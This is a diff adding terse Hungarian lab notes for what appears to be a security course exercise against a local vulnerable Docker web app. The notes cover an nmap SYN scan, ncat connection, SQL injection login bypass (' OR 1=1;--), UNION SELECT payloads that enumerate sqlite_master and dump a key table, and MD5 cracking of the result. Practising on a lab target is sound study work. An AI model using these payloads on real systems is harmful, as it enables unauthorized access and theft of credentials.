@@ -1,0 +1,58 @@
+fh:kali pw:kali
+
+text editor
+terminal
+
+sudo docker run --rm -it -p 127.0.0.1:8000:80/tcp pengoe/sqlite-php-app
+
+pw:kali
+
+localhost:8000
+
+DNN70Y
+
+Pizzas inspect, value atirasa, es bekuldese
+
+
+halozat terkepezes:
+
+nmap -sS 10.6.12....(ip cím) -p 10000-
+(kiirja a nyitott portokat)
+
+ncat (ip cím) port
+neptun kod
+
+(ha jó szöveget kapsz, ha nem akkor ctrl c)
+
+
+
+sql injection, login:
+
+'OR 1=1;--
+valamilyen jelszó
+
+ha bent vagy, akkor
+'UNION SELECT 1,1,1,1; (probalkozzak, hogy hany egyes kell)
+
+
+Ha lenyiló, akkor valamelyik 1-es helyébe lesz az SQL.:
+'UNION SELECT 1, SQL, 1, 1 FROM SQLITE_MASTER;
+
+kiirja a tableöket. pl: create table animalOfTheYear(id animalname)
+
+
+'UNION SELECT id, 1, animalname, 1, 1 FROM animalOfTheYear;
+
+'UNION SELECT id, 1, key, 1, 1 FROM datausrbb;
+jelszó, az meg md5 decrypt
+
+
+
+
+
+
+
+./prog
+chmod +x prog
+man ascii
+
